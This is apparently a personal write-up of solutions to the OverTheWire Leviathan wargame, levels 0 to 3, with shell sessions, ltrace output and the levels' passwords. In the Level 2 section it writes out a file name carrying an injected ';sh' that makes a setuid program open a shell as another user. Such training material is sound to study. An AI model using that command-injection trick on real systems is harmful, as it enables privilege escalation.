# Solutions
**THERE ARE SPOILERS AHEAD.**

These are my full solutions to the [leviathan](https://overthewire.org/wargames/leviathan/) ctf wargame. This is an "introductory" wargame so most of the challenges are fairly easy if you're familiar with common linux commands. If you're not familiar with the linux commands already, this ctf can be challenging but doable if you read the man pages and follow the hints. **Don't be discouraged!** You're learning a new language.

There are also a lot of good resources online for this war game in case you get stuck. My solutions will be fairly terse, although I will try to point out interesting things I find.


## Level 0
Log in with the username and password `leviathan0` given to us by the prompt.

## Level 0 to Level 1
Taking a look around on the server, this CTF seems to be structured similarly to the `bandit` other wargames that have passwords in `/etc/leviathan_pass/<password_file>`. Unfortunately, we can't read the `/etc/leviathan_pass/leviathan1` file.

Looking at the current directory, we see the following:

```bash
leviathan0@leviathan:~$ ls -hartl
total 24K
-rw-r--r--  1 root       root        675 May 15  2017 .profile
-rw-r--r--  1 root       root       3.5K May 15  2017 .bashrc
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
drwxr-xr-x 10 root       root       4.0K Aug 26  2019 ..
drwxr-x---  2 leviathan1 leviathan0 4.0K Aug 26  2019 .backup
drwxr-xr-x  3 root       root       4.0K Aug 26  2019 .
```

I took a look in `.profile`, `.bashrc`, `.bash_logout` and didn't see anything that stood out. `.backup` looks suspicious though. Inside that hidden directory, it has 1 file, `bookmarks.html` which is absolutely full of junk. Going out on a limb, I'm gonna `cat bookmarks.html | grep leviathan` and hope for the best. Lo and behold, I am rewarded with the following:

```
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

password: `rioGegei8m`

## Level 1 to Level 2
Looking in the main directory again, we see there's a file called `check`:

```bash
leviathan1@leviathan:~$ ls -hartl
total 28K
-rw-r--r--  1 root       root        675 May 15  2017 .profile
-rw-r--r--  1 root       root       3.5K May 15  2017 .bashrc
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
drwxr-xr-x 10 root       root       4.0K Aug 26  2019 ..
-r-sr-x---  1 leviathan2 leviathan1 7.3K Aug 26  2019 check
drwxr-xr-x  2 root       root       4.0K Aug 26  2019 .
```

It's a `setuid` binary which means that, if we can run it, it will run as the `leviathan2` user (the owner of the file). We can tell that by the `s` bit in the permissions section of the `check` file.

When we try to run it, it prompts us for a password. The current level's password does not work.

Going out on a limb, I looked through `strings check` to see if anything stood out. There were a few things that looked like they may have been passwords, but nothing worked.

I'm getting really desperate now and running `cat check`... on a binary file!? Yes. Scanning through, I see a LOT of garbage, but a few interesting words pop up. `sex`, `god`, `love`.

Running `check` and inputting `sex` for the password gives us a new prompt! Running `whoami` tells us that we are now `leviathan2`. Awesome. Time to get the password from `/etc/leviathan_pass/leviathan2`

password: `ougahZi8Ta`

## Level 2 to Level 3
Looking inside here, we again see a `setuid` binary called `printfile`. Running `printfile` alerts us to the fact that we need to give it a `filename` argument. Running `./printfile /etc/leviathan_pass/leviathan3` tells us that "cant have that file...". Hmm. `strings` and `cat` are no help here.

I had to do some googling for this one, and I found out about the `ltrace` command.

```bash
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                     = -1
puts("You cant have that file..."You cant have that file...
)                              = 27
+++ exited (status 1) +++
```

```bash
leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan2
__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
access("/etc/leviathan_pass/leviathan2", 4)                     = 0
snprintf("/bin/cat /etc/leviathan_pass/lev"..., 511, "/bin/cat %s", "/etc/leviathan_pass/leviathan2") = 39
geteuid()                                                       = 12002
geteuid()                                                       = 12002
setreuid(12002, 12002)                                          = 0
system("/bin/cat /etc/leviathan_pass/lev"...ougahZi8Ta
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                          = 0
+++ exited (status 0) +++
```

So, _if_ we had permission to the file, the system would run `/bin/cat <file>`. When we check for access, though, `printfile` tells us we don't have it. We can see that the system calls directly (without any sanitization). So, theoretically (and in actuality), we can make `printfile` run:

`/bin/cat /tmp/somedir/somefile;sh` which will plop us into the shell for `leviathan3`. We just need to

```
mkdir /tmp/somedir/
touch "/tmp/somedir/somefile;sh"
./printfile "/tmp/somedir/somefile;sh"
```

password: `Ahdiemoo1j`

There's also a slightly more in depth trick utilizing symlinks that can be found by googling for the solution to this level. I like my solution :).

## Level 3 to Level 4